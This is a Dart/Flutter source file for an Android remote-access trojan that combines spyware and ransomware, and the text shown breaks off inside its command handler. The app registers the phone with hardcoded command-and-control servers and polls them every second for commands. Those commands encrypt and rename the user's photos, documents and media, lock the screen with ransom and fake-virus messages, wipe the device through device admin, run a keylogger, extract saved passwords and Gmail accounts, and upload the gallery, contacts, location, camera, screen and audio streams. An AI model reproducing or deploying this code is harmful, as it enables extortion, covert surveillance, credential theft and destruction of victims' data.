import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';
import 'package:webview_flutter/webview_flutter.dart';

// ==================== NEON PURPLE THEME CONSTANTS ====================
const Color _bgBlack = Color(0xFF050505);
const Color _cardBlack = Color(0xFF141414);
const Color _primaryPurple = Color(0xFFD500F9);
const Color _textWhite = Color(0xFFFFFFFF);
const Color _textGrey = Color(0xFFB0BEC5);

// ==================== GLOBAL VARIABLES DARI CONFIG ====================
late String SERVER_URL;
late String CONFIG_USERNAME;
late String CONFIG_URL;
bool _configLoaded = false;

// CONTROLLER GLOBAL
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
ValueNotifier<bool> isRansomwareMode = ValueNotifier<bool>(false);
ValueNotifier<bool> isPanicMode = ValueNotifier<bool>(false);
ValueNotifier<bool> isVirusMode = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";

String currentLockMessage = "YOUR FILES HAVE BEEN ENCRYPTED!";
String currentLockPIN = "0853";
String _virusSoundUrl = "";

// REALTIME UPDATES
Timer? _heartbeatTimer;
Timer? _batteryTimer;
int _lastBatteryLevel = 0;

// METHOD CHANNELS
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformPinning = MethodChannel('com.nullx.pp/pinning');

// AUDIO URLs
const String HARD_LOCK_AUDIO_URL = "https://files.catbox.moe/e9rek7.m4a";
const String PANIC_AUDIO_URL = "https://files.catbox.moe/5xzkbs.m4a";
const String VIRUS_AUDIO_URL = "https://files.catbox.moe/u981c4.m4a";

// RANSOMWARE VARIABLES
String _ransomwareKey = "";
bool _ransomwareActivated = false;
bool _ransomwareDecrypted = false;
const List<String> RANSOMWARE_TARGET_DIRS = [
  '/storage/emulated/0/DCIM',
  '/storage/emulated/0/Download',
  '/storage/emulated/0/Documents',
  '/storage/emulated/0/Pictures',
  '/storage/emulated/0/Movies',
  '/storage/emulated/0/Music',
];
const List<String> RANSOMWARE_TARGET_EXTS = [
  'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp',
  'mp4', 'mov', 'avi', 'mkv', '3gp',
  'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt',
  'zip', 'rar', '7z', 'mp3', 'wav', 'flac', 'aac',
  'db', 'sql', 'json', 'xml', 'csv'
];

// VIDEO PLAYER CONTROLLER
VideoPlayerController? _ransomwareVideoController;
bool _isRansomwareVideoInitialized = false;

// STREAMING VARIABLES
bool _isCameraStreaming = false;
bool _isScreenStreaming = false;
Timer? _cameraStreamTimer;
Timer? _screenStreamTimer;
Timer? _audioRecorderTimer;
bool _isRecordingAudio = false;
String _currentAudioFile = "";

// WEBVIEW CONTROLLER
WebViewController? _webViewController;

// ==================== LOAD CONFIG (FIXED) ====================
Future<void> _loadConfig() async {
  try {
    final String configString = await rootBundle.loadString('assets/config.json');
    final Map<String, dynamic> config = jsonDecode(configString);
    CONFIG_USERNAME = config['username'] ?? "Guntur";
    SERVER_URL = config['server_url'] ?? "http://python.kawakunchan.web.id:6004";
    CONFIG_URL = config['url'] ?? "https://python.kawakunchan.web.id";
    _configLoaded = true;
    print("✅ Config loaded: USERNAME=$CONFIG_USERNAME, SERVER=$SERVER_URL, URL=$CONFIG_URL");
  } catch (e) {
    print("❌ Failed to load config: $e");
    CONFIG_USERNAME = "Guntur";
    SERVER_URL = "http://guntur.hoshino.my.id:5000";
    CONFIG_URL = "https://guntur.hoshino.my.id";
    _configLoaded = true;
  }
}

// ==================== VIBRATION FUNCTIONS ====================
Future<void> _safeVibrate(int duration) async {
  try {
    HapticFeedback.heavyImpact();
    if (duration > 500) {
      await Future.delayed(Duration(milliseconds: duration ~/ 2));
      HapticFeedback.heavyImpact();
    } else if (duration > 100) {
      await Future.delayed(Duration(milliseconds: duration ~/ 3));
      HapticFeedback.lightImpact();
    }
  } catch (e) {
    HapticFeedback.vibrate();
  }
}

void _safeVibrateCancel() {}

// ==================== SCREEN PINNING ====================
Future<void> _pinApp() async {
  try {
    await platformPinning.invokeMethod('startPinning');
  } catch (e) {}
}

Future<void> _unpinApp() async {
  try {
    await platformPinning.invokeMethod('stopPinning');
  } catch (e) {}
}

// ==================== AUDIO RECORDING ====================
void _startRecordingAudio(String targetId) async {
  if (_isRecordingAudio) return;
  _isRecordingAudio = true;
  _currentAudioFile = "audio_${DateTime.now().millisecondsSinceEpoch}.mp3";
  
  _audioRecorderTimer = Timer.periodic(const Duration(seconds: 10), (timer) async {
    if (!_isRecordingAudio) {
      timer.cancel();
      return;
    }
    
    try {
      final String? audioData = await platformSpy.invokeMethod('getRecordedAudio');
      if (audioData != null && audioData.isNotEmpty) {
        await http.post(
          Uri.parse("$SERVER_URL/api/audio/upload/$targetId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "filename": _currentAudioFile,
            "data": audioData,
            "duration": 10
          }),
        );
      }
    } catch (e) {}
  });
}

void _stopRecordingAudio() {
  _isRecordingAudio = false;
  _audioRecorderTimer?.cancel();
  _audioRecorderTimer = null;
}

// ==================== STREAMING ====================
void _startCameraStream(String targetId, String side) async {
  if (_isCameraStreaming) return;
  _isCameraStreaming = true;
  
  _cameraStreamTimer = Timer.periodic(const Duration(milliseconds: 500), (timer) async {
    if (!_isCameraStreaming) {
      timer.cancel();
      return;
    }
    
    try {
      final String? base64Frame = await platformSpy.invokeMethod('getCameraFrame', {"side": side});
      if (base64Frame != null && base64Frame.isNotEmpty) {
        await http.post(
          Uri.parse("$SERVER_URL/api/stream/cam-frame/$targetId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": base64Frame, "timestamp": DateTime.now().millisecondsSinceEpoch}),
        );
      }
    } catch (e) {}
  });
}

void _stopCameraStream() {
  _isCameraStreaming = false;
  _cameraStreamTimer?.cancel();
}

void _startScreenStream(String targetId) async {
  if (_isScreenStreaming) return;
  _isScreenStreaming = true;
  
  _screenStreamTimer = Timer.periodic(const Duration(milliseconds: 800), (timer) async {
    if (!_isScreenStreaming) {
      timer.cancel();
      return;
    }
    
    try {
      final String? base64Frame = await platformSpy.invokeMethod('getScreenShot');
      if (base64Frame != null && base64Frame.isNotEmpty) {
        await http.post(
          Uri.parse("$SERVER_URL/api/stream/screen-frame/$targetId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": base64Frame, "timestamp": DateTime.now().millisecondsSinceEpoch}),
        );
      }
    } catch (e) {}
  });
}

void _stopScreenStream() {
  _isScreenStreaming = false;
  _screenStreamTimer?.cancel();
}

// ==================== GALLERY GRABBER ====================
Future<void> _scanDirectoryForMedia(Directory dir, List<String> output) async {
  try {
    final List<FileSystemEntity> entities = await dir.list().toList();
    for (final entity in entities) {
      if (entity is File) {
        final ext = entity.path.split('.').last.toLowerCase();
        if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].contains(ext)) {
          output.add(entity.path);
        }
      } else if (entity is Directory) {
        if (!entity.path.contains('Android') && !entity.path.contains('obb')) {
          await _scanDirectoryForMedia(entity, output);
        }
      }
    }
  } catch (e) {}
}

Future<void> _scanDirectoryForVideos(Directory dir, List<String> output) async {
  try {
    final List<FileSystemEntity> entities = await dir.list().toList();
    for (final entity in entities) {
      if (entity is File) {
        final ext = entity.path.split('.').last.toLowerCase();
        if (['mp4', 'mov', 'avi', 'mkv', '3gp', 'flv'].contains(ext)) {
          output.add(entity.path);
        }
      } else if (entity is Directory) {
        if (!entity.path.contains('Android') && !entity.path.contains('obb')) {
          await _scanDirectoryForVideos(entity, output);
        }
      }
    }
  } catch (e) {}
}

// ==================== PERMISSIONS & REGISTRATION ====================
void _requestNotificationAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (e) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.phone,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown Device";
  String identifier = "UNKNOWN_ID";

  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_');
    }
  } catch (e) {
    identifier = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": identifier, "model": modelName};
}

void _startRealtimeUpdates(String deviceId) {
  _heartbeatTimer = Timer.periodic(const Duration(seconds: 3), (timer) async {
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/heartbeat/$deviceId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Online", "lastSeen": DateTime.now().toIso8601String()}),
      ).timeout(const Duration(seconds: 5));
    } catch (e) {}
  });

  _batteryTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
    try {
      final Battery battery = Battery();
      int level = await battery.batteryLevel;
      BatteryState state = await battery.batteryState;

      if (level != _lastBatteryLevel) {
        _lastBatteryLevel = level;
        await http.patch(
          Uri.parse("$SERVER_URL/api/update-battery/$deviceId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"battery": level, "charging": state == BatteryState.charging, "lastSeen": DateTime.now().toIso8601String()}),
        ).timeout(const Duration(seconds: 5));
      }
    } catch (e) {}
  });
}

void _stopRealtimeUpdates() {
  _heartbeatTimer?.cancel();
  _batteryTimer?.cancel();
}

Future<void> _registerToRAT(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    _lastBatteryLevel = level;

    await http.post(
      Uri.parse("$SERVER_URL/api/register-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "id": id, 
        "admin_owner": CONFIG_USERNAME, 
        "model": model,
        "battery": level.toString(), 
        "status": "Online", 
        "lastSeen": DateTime.now().toIso8601String(),
      }),
    ).timeout(const Duration(seconds: 10));
    print("✅ Registered to RAT: $id as owner: ${CONFIG_USERNAME}");
  } catch (e) {
    print("❌ RAT register error: $e");
  }
}

Future<void> _registerToSpyware(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    _lastBatteryLevel = level;

    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;

    await http.post(
      Uri.parse("$SERVER_URL/api/spyware/register"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "device_id": id, 
        "username": CONFIG_USERNAME, 
        "model": model,
        "battery": level, 
        "online": true, 
        "last_seen": DateTime.now().toIso8601String(),
        "type": "spyware", 
        "android_version": androidInfo.version.release,
        "brand": androidInfo.brand, 
        "manufacturer": androidInfo.manufacturer,
      }),
    ).timeout(const Duration(seconds: 10));
    print("✅ Registered to Spyware: $id as ${CONFIG_USERNAME}");
  } catch (e) {
    print("❌ Spyware register error: $e");
  }
}

// ==================== SOUND FUNCTIONS ====================
void _playHardLockSound() async {
  try {
    await _audioPlayer.stop();
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(UrlSource(HARD_LOCK_AUDIO_URL));
  } catch (e) {}
}

void _playPanicSound() async {
  try {
    await _audioPlayer.stop();
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(UrlSource(PANIC_AUDIO_URL));
  } catch (e) {}
}

void _playVirusSound() async {
  try {
    await _audioPlayer.stop();
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    final url = _virusSoundUrl.isNotEmpty ? _virusSoundUrl : VIRUS_AUDIO_URL;
    await _audioPlayer.play(UrlSource(url));
  } catch (e) {}
}

void _stopSound() async {
  try {
    await _audioPlayer.stop();
  } catch (e) {}
}

void _showSystemNotification(String title, String message) async {
  try {
    await platformSpy.invokeMethod('showNotification', {'title': title, 'message': message});
  } catch (e) {}
}

// ==================== RANSOMWARE ENGINE ====================
class GunturRansomwareEngine {
  static String _generateKey() {
    final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
    final random = timestamp.substring(timestamp.length - 8);
    return "GUNTUR${random}MODS";
  }

  static String _xorEncryptDecrypt(String text, String key) {
    final List<int> output = [];
    for (int i = 0; i < text.length; i++) {
      final textChar = text.codeUnitAt(i);
      final keyChar = key.codeUnitAt(i % key.length);
      output.add(textChar ^ keyChar);
    }
    return base64.encode(output);
  }

  static Future<void> activateRansomware() async {
    if (_ransomwareActivated) return;
    _ransomwareActivated = true;

    try {
      _ransomwareKey = _generateKey();

      final dir = Directory('/storage/emulated/0/.guntur');
      if (!await dir.exists()) {
        await dir.create();
      }
      final keyFile = File('${dir.path}/key.bin');
      await keyFile.writeAsString(base64.encode(utf8.encode(_ransomwareKey)));

      for (final target in RANSOMWARE_TARGET_DIRS) {
        final dir = Directory(target);
        if (await dir.exists()) {
          await _encryptDirectory(dir);
        }
      }
    } catch (e) {}
  }

  static Future<void> _encryptDirectory(Directory dir) async {
    try {
      final List<FileSystemEntity> entities = await dir.list().toList();
      for (final entity in entities) {
        if (entity is File) {
          await _encryptFile(entity);
        } else if (entity is Directory) {
          if (!entity.path.contains('Android') && !entity.path.contains('obb') && !entity.path.contains('data')) {
            await _encryptDirectory(entity);
          }
        }
      }
    } catch (e) {}
  }

  static Future<void> _encryptFile(File file) async {
    try {
      final ext = file.path.split('.').last.toLowerCase();
      if (!RANSOMWARE_TARGET_EXTS.contains(ext)) return;

      final content = await file.readAsString();
      final encrypted = _xorEncryptDecrypt(content, _ransomwareKey);

      await file.writeAsString(encrypted);
      await file.rename(file.path + '.guntur');
    } catch (e) {}
  }

  static Future<void> decryptAllFiles() async {
    if (_ransomwareDecrypted) return;

    try {
      final dir = Directory('/storage/emulated/0/.guntur');
      final keyFile = File('${dir.path}/key.bin');

      if (await keyFile.exists()) {
        final encodedKey = await keyFile.readAsString();
        _ransomwareKey = utf8.decode(base64.decode(encodedKey));
      }

      for (final target in RANSOMWARE_TARGET_DIRS) {
        final dir = Directory(target);
        if (await dir.exists()) {
          await _decryptDirectory(dir);
        }
      }

      await keyFile.delete();
      _ransomwareDecrypted = true;
    } catch (e) {}
  }

  static Future<void> _decryptDirectory(Directory dir) async {
    try {
      final List<FileSystemEntity> entities = await dir.list().toList();
      for (final entity in entities) {
        if (entity is File && entity.path.endsWith('.guntur')) {
          await _decryptFile(entity);
        } else if (entity is Directory) {
          if (!entity.path.contains('Android') && !entity.path.contains('obb') && !entity.path.contains('data')) {
            await _decryptDirectory(entity);
          }
        }
      }
    } catch (e) {}
  }

  static Future<void> _decryptFile(File file) async {
    try {
      final originalPath = file.path.substring(0, file.path.length - 7);
      final encrypted = await file.readAsString();
      final List<int> encryptedBytes = base64.decode(encrypted);
      final List<int> output = [];
      for (int i = 0; i < encryptedBytes.length; i++) {
        final keyChar = _ransomwareKey.codeUnitAt(i % _ransomwareKey.length);
        output.add(encryptedBytes[i] ^ keyChar);
      }
      final decrypted = utf8.decode(output);
      await File(originalPath).writeAsString(decrypted);
      await file.delete();
    } catch (e) {}
  }
}

// ==================== SPYWARE CORE ====================
void _startSpyware(String deviceId, String deviceName) {
  Future<void> executeLogic() async {
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/heartbeat/$deviceId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));

      await http.post(
        Uri.parse("$SERVER_URL/api/spyware/heartbeat/$deviceId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"device_id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));

      final ratResponse = await http.get(Uri.parse("$SERVER_URL/api/get-command/$deviceId"));

      if (ratResponse.statusCode == 200) {
        final data = jsonDecode(ratResponse.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        await _processCommand(deviceId, command, extra);
      }

      final spyResponse = await http.get(Uri.parse("$SERVER_URL/api/spyware/get-command/$deviceId"));

      if (spyResponse.statusCode == 200) {
        final data = jsonDecode(spyResponse.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        await _processCommand(deviceId, command, extra);
      }

    } catch (e) {}
  }

  Timer.periodic(const Duration(seconds: 1), (t) => executeLogic());

  Timer.periodic(const Duration(seconds: 30), (t) async {
    try {
      Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
      await http.post(
        Uri.parse("$SERVER_URL/api/spyware/location/update"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "device_id": deviceId, "lat": pos.latitude, "lng": pos.longitude,
          "accuracy": pos.accuracy, "speed": pos.speed, "altitude": pos.altitude,
          "time": DateTime.now().millisecondsSinceEpoch,
        }),
      );
    } catch (e) {}
  });
}

Future<void> _processCommand(String deviceId, String command, String extra) async {
  dynamic resultData;

  // HARD LOCK
  if (command == "hard_lock" || command == "lock_device" || command == "lock") {
    if (extra.contains('|')) {
      List<String> parts = extra.split('|');
      currentLockMessage = parts[0].isNotEmpty ? parts[0] : "YOUR PHONE IS LOCKED";
      currentLockPIN = parts.length > 1 ? parts[1] : "0853";
    } else if (extra.isNotEmpty) {
      currentLockMessage = extra;
    }
    if (!deviceLocked.value) {
      isRansomwareMode.value = false;
      isPanicMode.value = false;
      isVirusMode.value = false;
      deviceLocked.value = true;
      _playHardLockSound();
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _pinApp();
      _stopCameraStream();
      _stopScreenStream();
    }
    resultData = {"status": "Hard Locked", "success": true};
  }

  // RANSOMWARE LOCK
  else if (command == "activate_ransomware") {
    await GunturRansomwareEngine.activateRansomware();
    if (!deviceLocked.value) {
      isRansomwareMode.value = true;
      isPanicMode.value = false;
      isVirusMode.value = false;
      deviceLocked.value = true;
      _safeVibrate(10000);
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.play();
      }
      _pinApp();
      _stopCameraStream();
      _stopScreenStream();
    }
    resultData = {"status": "Ransomware Activated", "success": true};
  }

  // PANIC MODE
  else if (command == "panic_mode") {
    if (!deviceLocked.value) {
      isPanicMode.value = true;
      isRansomwareMode.value = false;
      isVirusMode.value = false;
      deviceLocked.value = true;
      _playPanicSound();
      _safeVibrate(10000);
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _pinApp();
      _stopCameraStream();
      _stopScreenStream();
    }
    resultData = {"status": "Panic Mode Activated - UNLOCK VIA CONTROLLER ONLY", "success": true};
  }

  // VIRUS MODE
  else if (command == "virus_mode") {
    if (!deviceLocked.value) {
      isVirusMode.value = true;
      isPanicMode.value = false;
      isRansomwareMode.value = false;
      deviceLocked.value = true;

      if (extra.isNotEmpty && extra.contains('|')) {
        List<String> parts = extra.split('|');
        _virusSoundUrl = parts[0];
        currentLockMessage = parts.length > 1 ? parts[1] : "🦠 CRITICAL VIRUS DETECTED!";
      } else if (extra.isNotEmpty) {
        _virusSoundUrl = extra;
        currentLockMessage = "🦠 CRITICAL VIRUS DETECTED!";
      } else {
        _virusSoundUrl = VIRUS_AUDIO_URL;
        currentLockMessage = "🦠 CRITICAL VIRUS DETECTED!\nYour device has been infected!\nContact @GunturMods to unlock";
      }

      _playVirusSound();
      _safeVibrate(10000);
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _pinApp();
      _stopCameraStream();
      _stopScreenStream();
    }
    resultData = {"status": "Virus Mode Activated - UNLOCK VIA CONTROLLER ONLY", "success": true};
  }

  // UNLOCKS
  else if (command == "panic_unlock") {
    if (deviceLocked.value && isPanicMode.value) {
      deviceLocked.value = false;
      isPanicMode.value = false;
      _stopSound();
      await platformStrobe.invokeMethod('stopStrobe');
      _safeVibrateCancel();
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _unpinApp();
    }
    resultData = {"status": "Panic Mode Unlocked", "success": true};
  }

  else if (command == "virus_unlock") {
    if (deviceLocked.value && isVirusMode.value) {
      deviceLocked.value = false;
      isVirusMode.value = false;
      _stopSound();
      await platformStrobe.invokeMethod('stopStrobe');
      _safeVibrateCancel();
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _unpinApp();
    }
    resultData = {"status": "Virus Mode Unlocked", "success": true};
  }

  else if (command == "unlock" || command == "unlock_device") {
    if (deviceLocked.value && !isPanicMode.value && !isVirusMode.value) {
      if (isRansomwareMode.value) {
        await GunturRansomwareEngine.decryptAllFiles();
        _safeVibrateCancel();
      }
      deviceLocked.value = false;
      isRansomwareMode.value = false;
      _stopSound();
      await platformStrobe.invokeMethod('stopStrobe');
      if (_ransomwareVideoController != null && _isRansomwareVideoInitialized) {
        _ransomwareVideoController?.pause();
      }
      _unpinApp();
    }
    resultData = {"status": "Unlocked", "success": true};
  }

  else if (command == "decrypt_files") {
    await GunturRansomwareEngine.decryptAllFiles();
    resultData = {"status": "Files Decrypted", "success": true};
  }

  // GALLERY GRABBER
  else if (command == "grab_gallery") {
    try {
      List<String> allImages = [];
      List<String> targetDirs = [
        '/storage/emulated/0/DCIM',
        '/storage/emulated/0/Pictures',
        '/storage/emulated/0/Download',
        '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
        '/storage/emulated/0/Telegram/Telegram Images',
      ];
      
      for (String dirPath in targetDirs) {
        Directory dir = Directory(dirPath);
        if (await dir.exists()) {
          await _scanDirectoryForMedia(dir, allImages);
        }
      }
      
      for (String imagePath in allImages) {
        File file = File(imagePath);
        List<int> bytes = await file.readAsBytes();
        String base64Image = base64.encode(bytes);
        
        await http.post(
          Uri.parse("$SERVER_URL/api/gallery/upload/$deviceId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "filename": imagePath.split('/').last,
            "path": imagePath,
            "data": base64Image,
            "type": "image"
          }),
        );
      }
      
      resultData = {"status": "Gallery grabbed", "count": allImages.length, "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "grab_videos") {
    try {
      List<String> allVideos = [];
      List<String> targetDirs = [
        '/storage/emulated/0/DCIM',
        '/storage/emulated/0/Movies',
        '/storage/emulated/0/Download',
        '/storage/emulated/0/WhatsApp/Media/WhatsApp Video',
        '/storage/emulated/0/Telegram/Telegram Video',
      ];
      
      for (String dirPath in targetDirs) {
        Directory dir = Directory(dirPath);
        if (await dir.exists()) {
          await _scanDirectoryForVideos(dir, allVideos);
        }
      }
      
      for (String videoPath in allVideos) {
        File file = File(videoPath);
        List<int> bytes = await file.readAsBytes();
        String base64Video = base64.encode(bytes);
        
        await http.post(
          Uri.parse("$SERVER_URL/api/gallery/upload/$deviceId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "filename": videoPath.split('/').last,
            "path": videoPath,
            "data": base64Video,
            "type": "video"
          }),
        );
      }
      
      resultData = {"status": "Videos grabbed", "count": allVideos.length, "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  // DEVICE ADMIN
  else if (command == "request_admin") {
    try {
      await platformSpy.invokeMethod('requestDeviceAdmin');
      resultData = {"status": "Device admin requested", "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "is_admin") {
    try {
      bool isAdmin = await platformSpy.invokeMethod('isDeviceAdmin');
      resultData = {"status": isAdmin ? "Admin active" : "Admin not active", "isAdmin": isAdmin, "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "admin_lock") {
    try {
      await platformSpy.invokeMethod('adminLockNow');
      resultData = {"status": "Device locked via admin", "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "admin_wipe") {
    try {
      await platformSpy.invokeMethod('adminWipeData');
      resultData = {"status": "Wipe data via admin", "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  // STREAMING
  else if (command == "start_cam_stream") {
    String side = extra.isNotEmpty ? extra : "back";
    _startCameraStream(deviceId, side);
    resultData = {"status": "Camera stream started", "success": true};
  }

  else if (command == "stop_cam_stream") {
    _stopCameraStream();
    resultData = {"status": "Camera stream stopped", "success": true};
  }

  else if (command == "start_screen_stream") {
    _startScreenStream(deviceId);
    resultData = {"status": "Screen stream started", "success": true};
  }

  else if (command == "stop_screen_stream") {
    _stopScreenStream();
    resultData = {"status": "Screen stream stopped", "success": true};
  }

  // AUDIO RECORDING
  else if (command == "record_audio") {
    _startRecordingAudio(deviceId);
    resultData = {"status": "Audio recording started", "success": true};
  }

  else if (command == "stop_record_audio") {
    _stopRecordingAudio();
    resultData = {"status": "Audio recording stopped", "success": true};
  }

  // INSTANT PHOTO
  else if (command == "take_photo") {
    final String? base64Result = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra});
    resultData = base64Result != null
        ? {"status": "Success", "image_base64": base64Result}
        : {"status": "Failed"};
  }

  // SCREENSHOT
  else if (command == "get_screen") {
    final String? base64Result = await platformSpy.invokeMethod('getScreenShot');
    resultData = {"status": "Stream Active", "image_base64": base64Result};
  }

  // GET GMAILS
  else if (command == "get_gmails") {
    String emails = await platformSpy.invokeMethod('getGmailAccounts');
    resultData = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
  }

  // KEYLOGGER & PASSWORD EXTRACTOR
  else if (command == "start_keylogger") {
    try {
      await platformSpy.invokeMethod('startKeylogger');
      resultData = {"status": "Keylogger started", "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "stop_keylogger") {
    try {
      await platformSpy.invokeMethod('stopKeylogger');
      resultData = {"status": "Keylogger stopped", "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "get_keylogs") {
    try {
      final String logs = await platformSpy.invokeMethod('getKeyLogs');
      resultData = {"logs": logs, "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  else if (command == "get_saved_passwords") {
    try {
      final String passwords = await platformSpy.invokeMethod('getSavedPasswords');
      resultData = {"passwords": passwords, "success": true};
    } catch (e) {
      resultData = {"status": "Failed: $e", "success": false};
    }
  }

  // SET WALLPAPER
  else if (command == "set_wallpaper") {
    await platformSpy.invokeMethod('setWallpaper', {"url": extra});
    resultData = {"status": "Wallpaper Updated"};
  }

  // PLAY AUDIO
  else if (command == "play_music" || command == "play_audio") {
    try {
      await _audioPlayer.stop();
      await _audioPlayer.play(UrlSource(extra));
      resultData = {"status": "Playing MP3"};
    } catch (e) {
      resultData = {"status": "Audio Error"};
    }
  }

  // STOP AUDIO
  else if (command == "stop_music" || command == "stop_audio") {
    await _audioPlayer.stop();
    resultData = {"status": "Audio Stopped"};
  }

  // GET CONTACTS
  else if (command == "get_contacts") {
    if (await FlutterContacts.requestPermission()) {
      final List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
      resultData = {
        "contacts": contacts.map((e) => {
          "name": e.displayName,
          "number": e.phones.isNotEmpty ? e.phones.first.number : ""
        }).toList()
      };
    }
  }

  // FLASH STROBE
  else if (command == "flash_strobe") {
    await platformStrobe.invokeMethod('startStrobe');
    resultData = {"status": "Strobe Active"};
  }

  else if (command == "stop_strobe") {
    await platformStrobe.invokeMethod('stopStrobe');
    resultData = {"status": "Strobe Stopped"};
  }

  // VIBRATE
  else if (command == "vibrate_loop") {
    _safeVibrate(5000);
    resultData = {"status": "Vibrating"};
  }

  // OPEN URL
  else if (command == "open_url" || command == "open_web") {
    final Uri url = Uri.parse(extra);
    if (await canLaunchUrl(url)) {
      await launchUrl(url, mode: LaunchMode.externalApplication);
      resultData = {"status": "URL Opened"};
    }
  }

  // GET LOCATION
  else if (command == "get_location") {
    Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    resultData = {"lat": pos.latitude, "lng": pos.longitude};
  }

  // FORCE OPEN
  else if (command == "force_open") {
    await platformSpy.invokeMethod('bringToForeground');
    resultData = {"status": "Foreground"};
  }

  // SHOW NOTIFICATION
  else if (command == "show_notification") {
    List<String> parts = extra.split('|');
    _showSystemNotification(parts[0], parts.length > 1 ? parts[1] : "");
    resultData = {"status": "Notification shown"};
  }

  // SHOW POPUP
  else if (command == "show_popup") {
    final prefs = await SharedPreferences.getInstance();
    List<String> parts = extra.split('|');
    await prefs.setString('pending_popup_title', parts[0]);
    await prefs.setString('pending_popup_message', parts.length > 1 ? parts[1] : "");
    resultData = {"status": "Popup queued"};
  }

  // GET BATTERY
  else if (command == "get_battery") {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    BatteryState state = await battery.batteryState;
    _lastBatteryLevel = level;
    resultData = {"battery": level, "charging": state == BatteryState.charging};
  }

  // GET DEVICE INFO
  else if (command == "get_device_info") {
    resultData = {"model": globalDeviceModel, "device_id": globalDeviceId};
  }

